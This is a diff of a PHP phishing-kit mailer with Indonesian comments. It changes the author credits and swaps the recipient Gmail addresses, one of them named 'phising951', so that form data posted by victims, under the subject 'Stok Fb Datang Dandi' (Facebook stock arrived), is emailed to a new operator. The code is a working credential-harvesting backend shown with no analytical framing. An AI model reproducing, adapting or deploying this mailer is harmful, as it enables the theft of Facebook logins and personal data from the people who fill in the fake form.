@@ -1,13 +1,13 @@
 <?php
 ############################################
-##        Author: Abdul aziz                ##
-##       Mailer: Lomen                    ##
-##  Modifer: scriptpesing.blogspot.com  ##
+##        Author: T-faces                ##
+##       Mailer: Aray2                    ##
+##  Modifer: https://t-faces.github.io  ##
 ############################################
 /* JANGAN GANTI COPYRIGHT NYA YA SAYANG */
 
 $subjek = 'Stok Fb Datang Dandi';
-$mailto = 'phising951@gmail.com'; //masukin email lo disini
+$mailto = 'ariagungsatria01@gmail.com'; //masukin email lo disini
 
 /* Fungsi berikut untuk mengambil input field. */
 $Nama = $_POST['Nama'];
@@ -46,7 +46,7 @@ $success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim
 
 
 $subjek = 'Stok Fb Datang Dandi';
-$mailto = 'facebookbae11@gmail.com'; //masukin email lo disini
+$mailto = 'ariagungsatria01@gmail.com'; //masukin email lo disini
 
 /* Fungsi berikut untuk mengambil input field. */
 $Nama = $_POST['Nama'];
